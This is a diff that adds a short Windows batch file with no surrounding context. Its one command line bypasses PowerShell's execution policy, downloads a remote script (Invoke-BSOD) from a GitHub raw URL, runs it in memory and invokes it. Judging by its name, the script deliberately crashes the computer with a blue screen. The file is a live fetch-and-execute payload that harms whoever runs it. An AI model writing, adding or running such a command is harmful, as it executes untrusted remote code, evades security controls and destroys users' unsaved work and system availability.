@@ -1,0 +1,2 @@
+@echo off
+powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1')); Invoke-BSOD"
